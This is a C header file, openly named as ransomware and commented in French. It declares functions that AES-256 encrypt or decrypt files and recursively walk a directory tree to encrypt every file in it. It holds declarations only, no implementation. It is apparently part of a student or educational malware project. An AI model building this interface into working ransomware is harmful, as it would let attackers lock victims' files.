#ifndef RANSOMWARE_H
#define RANSOMWARE_H

#include <openssl/evp.h>
#include <openssl/aes.h>
  
#define BUFFER_SIZE 4096 
#define KEY_SIZE 32 // Taille de la clé AES (256 bits)
#define IV_SIZE 16  // Taille du vecteur d'initialisation (IV)
#define AES_BLOCK_SIZE 16 // Tampon de 16 octets pour s'assurer qu'il y a suffisamment d'espace pour les données traitées par AES

/**
 * Fonction pour chiffrer un fichier.
 *
 * @param input_path Chemin du fichier à chiffrer.
 * @param key Clé de chiffrement (doit être de taille KEY_SIZE).
 * @param iv Vecteur d'initialisation (doit être de taille IV_SIZE).
 * @return 0 en cas de succès, -1 en cas d'erreur.
 */
int encrypt_file(const char *input_path, unsigned char *key, unsigned char *iv);

/**
 * Fonction pour déchiffrer un fichier.
 *
 * @param input_path Chemin du fichier à déchiffrer.
 * @param key Clé de déchiffrement (doit être de taille KEY_SIZE).
 * @param iv Vecteur d'initialisation (doit être de taille IV_SIZE).
 * @return 0 en cas de succès, -1 en cas d'erreur, -2 si la clé ou l'IV est incorrect.
 */
int decrypt_file(const char *input_path, unsigned char *key, unsigned char *iv);

/**
 * Fonction pour lire et chiffrer/déchiffrer un répertoire et ses sous-répertoires.
 *
 * @param dir_path Chemin du répertoire à parcourir.
 * @param mode Mode d'opération : 0 pour chiffrer, 1 pour déchiffrer.
 * @param key Clé de chiffrement/déchiffrement (doit être de taille KEY_SIZE).
 * @param iv Vecteur d'initialisation (doit être de taille IV_SIZE).
 */
void read_and_crypt_directory(const char *dir_path, int mode, unsigned char *key, unsigned char *iv);

/**
 * Fonction auxiliaire pour vérifier si un fichier est régulier.
 *
 * @param path Chemin du fichier à vérifier.
 * @return 1 si le fichier est régulier, 0 sinon.
 */
int is_regular_file(const char *path);

/**
 * Fonction auxiliaire pour vérifier si un chemin correspond à un répertoire.
 *
 * @param path Chemin à vérifier.
 * @return 1 si le chemin est un répertoire, 0 sinon.
 */
int is_directory(const char *path);

/**
 * Fonction pour construire le chemin d'accès complet d'un fichier.
 *
 * @param directory Chemin du répertoire parent.
 * @param file Nom du fichier.
 * @param full_path Buffer pour stocker le chemin complet.
 * @param size Taille du buffer full_path.
 */
void construct_path(const char *directory, const char *file, char *full_path, size_t size);

#endif // RANSOMWARE_H
